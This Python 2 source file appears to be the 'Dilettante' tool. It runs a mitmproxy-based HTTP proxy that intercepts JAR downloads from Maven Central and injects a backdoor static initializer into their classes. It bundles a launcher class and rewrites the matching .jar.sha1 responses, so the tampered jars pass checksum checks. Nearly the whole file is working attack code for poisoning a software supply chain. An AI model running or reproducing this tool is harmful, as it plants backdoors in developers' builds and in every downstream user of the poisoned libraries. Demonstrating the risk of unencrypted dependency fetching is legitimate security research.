#!/usr/bin/env python

import os, re, zipfile, hashlib, sys, tempfile, os, atexit, warnings, logging, argparse
from libmproxy import controller, proxy, flow, utils, platform
sys.path.append("./Krakatau")
import Krakatau, Krakatau.binUnpacker
from Krakatau.classfile import ClassFile
from Krakatau.assembler import tokenize, parse, assembler, disassembler

#zipfile will issue a lot of warnings on duplicate files...
warnings.simplefilter("ignore")

#zipfile will issue a lot of warn
class JarJar:
    # It's a jar of jars okay?

    backdoor_shim = """
    .method static <clinit> : ()V
	; method code size: 4 bytes
	.limit stack 0
	.limit locals 0
	invokestatic dilettante/Dilettante backdoor ()V
	return
    .end method
    """
    with open("Dilettante.class") as f:
        backdoor_launcher = f.read()

    with open("sad_cat.jpg") as f:
        image = f.read()
    
    def __init__(self):
        self.jars = {}
        self.hashes = {}
        atexit.register(self._cleanup)
        
    def has_jar(self, path):
        return path in self.jars
        
    def get_jar(self, path):
        # TODO: handle error gracefully
        with open(self.jars[path]) as f:
            return f.read()

    def get_hash(self, path):
        # this is not super graceful
        while path not in self.hashes:
            time.sleep(1)
        return self.hashes[path]
        
    def add_jar(self, path, jar_contents):
        # returns backdoored jar to caller
        with tempfile.NamedTemporaryFile(delete=False) as tf:
            jar_path = tf.name
            tf.write(jar_contents)
        self._backdoor_jar(jar_path)
        # is this inefficient 
        with open(jar_path) as f:
            jar_contents = f.read()

        hsh = hashlib.sha1(jar_contents).hexdigest()
        self.jars[path] = jar_path
        self.hashes[path + ".sha1"] = hsh 
        return jar_contents 

    def _backdoor_jar(self, jar_path):
        zp = zipfile.ZipFile(jar_path, "a")
        count = 0
        for zinfo in zp.infolist():
            filename = zinfo.filename
            # inject our backdoor shim into every class that's not an inner class or has a _ 
            # to not get too crazy, we'll backdoor the first 100 classes we see and stop
            # TODO: come up with a better way to speed this up
            if count < 1000 and str.endswith(filename, ".class") and "$" not in filename and "_" not in filename:
                data = zp.read(zinfo)
                # disassemble class with Krakatau
                stream = Krakatau.binUnpacker.binUnpacker(data=data)
                class_ = ClassFile(stream)
                class_.loadElements(keepRaw=True)
                source = Krakatau.assembler.disassembler.disassemble(class_)
            
                # don't want to overwrite the "static" method
                if ".method static <clinit> : ()V" not in source and ".method static public <clinit> : ()V" not in source:
                    count += 1
                    # add backdoor and assemble again
                    backdoored_source = "\n" + source + self.backdoor_shim
                
                    lexer = tokenize.makeLexer(debug=False)
                    parser = parse.makeParser(debug=False)
                    parse_trees = parser.parse(backdoored_source, lexer=lexer)
                    backdoored_class = assembler.assemble(parse_trees[0], False, False, filename)[1]
                
                    # write backdoored class to zip
                    logging.debug("backdooring class" + filename)
                    zp.writestr(filename, backdoored_class)

        zp.writestr("dilettante/Dilettante.class", self.backdoor_launcher)
        zp.writestr("dilettante/sad_cat.jpg", self.image)
        zp.close()

    def _cleanup(self):
        for k,v in self.jars.iteritems():
            logging.info("cleaning up jar " + k + " by deleting " + v)
            os.remove(v)


class DilettanteMaster(flow.FlowMaster):
    def __init__(self, server):
        flow.FlowMaster.__init__(self, server, flow.State())
        # it's a jar of jars
        self.jar_jar = JarJar()
        
        
    def shutdown(self):  # pragma: no cover
        return flow.FlowMaster.shutdown(self)

    def run(self):
        try:
            return flow.FlowMaster.run(self)
        except:
            self.shutdown()

    def handle_request(self, msg):
        
        f = flow.FlowMaster.handle_request(self, msg)
        logging.info("got request " + f.request.host + f.request.path)
        if f:
            msg.reply()
        return f

    def handle_response(self, msg):
        f = flow.FlowMaster.handle_response(self, msg)
        if f:
            self.process_flow(f, msg)
        return f
    
    def process_flow(self, f, r):
        # Replace any JARs from Maven Central with backdoored versions
        host = f.request.host
        path = f.request.path
        # check host for Maven Central
        if (host == "repo1.maven.org") or (host == "repo.maven.apache.org"):
            if re.match(".*\.jar$", path):
                # found a jar
                if self.jar_jar.has_jar(path):
                    # we have a saved copy in our jar of jars
                    logging.info("retrieving previously backdoored jar " + path)
                    f.response.content = self.jar_jar.get_jar(path)

                
                else:
                    # we need to backdoor the jar
                    logging.info("starting to backdoor jar " + path)
                    backdoored_jar = self.jar_jar.add_jar(path, f.response.content)
                    logging.info("done backdooring jar " + path)
                    f.response.content = backdoored_jar
            
        elif re.match(".*\.jar.sha1$", path):
            # return the hash of the backdoored jar
            f.response.content =  self.jar_jar.get_hash(path)

        r.reply()

        return f
        
    



if __name__ == "__main__":
    parser = argparse.ArgumentParser(usage = "%(prog)s [options]")
    parser.add_argument("--debug", type=str, default=None, action="store", help="Debugging level: info, debug, or none")
    
        
    options = parser.parse_args()
    if options.debug:
        if str.lower(options.debug) == "debug":
            logging.basicConfig(stream = sys.stdout, level=logging.DEBUG)
        elif str.lower(options.debug) == "info":
            logging.basicConfig(stream = sys.stdout, level=logging.INFO)
        else:
            print "I don't understand debugging level %s" % options.debug

  
    config = proxy.ProxyConfig(
       # Note there is no SSL certificate set here
       
    )
    server = proxy.ProxyServer(config, 8080)
    m = DilettanteMaster(server)
    m.run()

